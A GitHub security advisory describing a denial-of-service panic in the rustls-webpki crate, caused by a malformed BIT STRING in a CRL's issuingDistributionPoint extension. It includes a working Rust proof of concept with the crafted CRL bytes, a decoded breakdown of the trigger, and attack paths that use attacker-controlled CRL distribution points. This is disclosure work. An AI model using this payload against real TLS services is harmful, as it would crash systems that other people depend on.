# [H] rustls-webpki: Denial of service via panic on malformed CRL BIT STRING

## Summary
Severity: High
Advisory: GHSA-82j2-j2ch-gfr8
CWE: CWE-125
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-24
Source: https://github.com/advisories/GHSA-82j2-j2ch-gfr8
Type: github-advisory

## Affected
- crates.io: `rustls-webpki` — affected >=0 <0.103.13
- crates.io: `rustls-webpki` — affected >=0.104.0-alpha.1 <0.104.0-alpha.7

## Details
### Summary

`bit_string_flags()` in `src/der.rs` panics with an index-out-of-bounds when given a BIT STRING whose content is exactly `[0x00]` (one byte: zero padding bits, zero data bytes). This is reachable through the public API `BorrowedCertRevocationList::from_der()` via the `issuingDistributionPoint` CRL extension.

**Precondition**: CRL checking is opt-in in rustls-webpki. This vulnerability affects only applications that explicitly pass `RevocationOptions` to `verify_for_usage()` and load CRL bytes from a source the attacker can influence. The default rustls configuration (no `RevocationOptions`) is not affected.

> **AI disclosure**: This report was prepared with AI assistance (Claude). The vulnerability was discovered by differential fuzzing against a formally-verified Rust oracle. All technical claims have been independently verified against the live source code before submission.

### Details
`bit_string_flags()` in `src/der.rs` reads the content of named-bit BIT
STRINGs (KeyUsage, ReasonFlags, etc.). Its input guard:

```rust
if padding_bits > 7 || (raw_bits.is_empty() && padding_bits != 0) {
    return Err(Error::BadDer);
}
let last_byte = raw_bits[raw_bits.len() - 1];  // ← crash
```
misses the case `padding_bits == 0 && raw_bits.is_empty()`.
When a BIT STRING has content `[0x00]`  (one padding-bits byte set to zero, no data bytes):
- padding_bits = 0x00 — passes the > 7 check ✓
- raw_bits = [] — passes is_empty() && != 0 check ✓ (because 0 != 0 is false)
- raw_bits.len() - 1 = 0usize - 1 = underflow → usize::MAX
- raw_bits[usize::MAX] → panic


Debug:   thread 'main' panicked: attempt to subtract with overflow
Release: thread 'main' panicked: index out of bounds: the len is 0
         but the index is 18446744073709551615

### PoC
Cargo.toml:
```
[dependencies]
rustls-webpki = "0.102.8"   # also reproduces on 0.103.12
```
src/main.rs:
```
fn main() {
    let crl: &[u8] = &[
        0x30, 0x65, 0x30, 0x50, 0x02, 0x01, 0x01, 0x30, 0x0d, 0x06, 0x09,
        0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00,
        0x30, 0x0c, 0x31, 0x0a, 0x30, 0x08, 0x06, 0x03, 0x55, 0x04, 0x03,
        0x13, 0x01, 0x41, 0x17, 0x0d, 0x32, 0x30, 0x30, 0x31, 0x30, 0x31,
        0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5a, 0x17, 0x0d, 0x32, 0x31,
        0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5a,
        0xa0, 0x10, 0x30, 0x0e, 0x30, 0x0c, 0x06, 0x03, 0x55, 0x1d, 0x1c,
        0x04, 0x05, 0x30, 0x03, 0x83, 0x01, 0x00, 0x30, 0x0d, 0x06, 0x09,
        0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00,
        0x03, 0x02, 0x00, 0x00,
    ];
    // Panics — never returns
    let _ = webpki::BorrowedCertRevocationList::from_der(crl);
}
```
output:
```
thread 'main' panicked at src/der.rs:...
index out of bounds: the len is 0 but the index is 18446744073709551615
```
#### Trigger
```
a0 10            -- cRLExtensions [0] EXPLICIT
  30 0e          -- SEQUENCE OF Extension
    30 0c        -- Extension SEQUENCE
      06 03 55 1d 1c   -- OID 2.5.29.28 (id-ce-issuingDistributionPoint)
      04 05            -- OCTET STRING (extnValue)
        30 03          -- IssuingDistributionPoint SEQUENCE
          83 01 00     -- [3] onlySomeReasons: BIT STRING, len=1, content=0x00
                       --   padding_bits=0, data=[]  ← TRIGGER
```


### Impact
- Who is affected: 
Applications that (1) use rustls-webpki with CRL
revocation checking explicitly enabled via RevocationOptions, and (2)
load CRL bytes from a source an attacker can influence.
- Attack paths:
    - mTLS server (most realistic): An attacker obtains any certificate from a CA that permits custom CDP URLs — common in enterprise PKI. They set the CDP to a server they control, serve the 103-byte crafted CRL, and connect to the target. The server fetches the attacker's CRL during the handshake and panics. No MITM required.
    - TLS client with server-cert CRL checking: An attacker who can MITM an HTTP CRL distribution point (ARP/DNS poisoning on a local network) serves the crafted CRL in place of the legitimate one.

## References
- https://github.com/rustls/webpki/security/advisories/GHSA-82j2-j2ch-gfr8
- https://github.com/rustls/webpki
- https://rustsec.org/advisories/RUSTSEC-2026-0104.html
